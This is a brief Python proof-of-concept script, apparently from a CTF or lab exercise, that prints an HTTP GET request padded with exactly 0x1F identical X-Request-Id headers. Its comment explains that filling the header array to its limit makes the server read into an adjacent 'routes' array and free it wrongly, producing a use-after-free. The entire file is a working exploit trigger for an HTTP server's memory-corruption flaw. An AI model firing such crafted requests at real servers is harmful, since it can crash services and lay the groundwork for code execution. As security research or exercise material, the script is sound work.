#!/usr/bin/env python3

from pwn import * 

'''
If we got to EXACTLY the length of the amount of headers for a 
response, it creates problems. 

Some of the usage of 'res_headers_lst' only check for NULL and 
NOT the maximum amount. As a result, we can use the pointer AFTER
this to do things. 
In practice, this is the 'routes' array! 

The usage includes an unnecessary free, which creates a UAF on the routes. 
'''

# Line one
string = "GET /files/hello_world.html HTTP/1.1\r\n"

# Headers
string += "X-Request-Id:AAA\r\n" * 0x1F
string += "\r\n"

print(string, end='')  
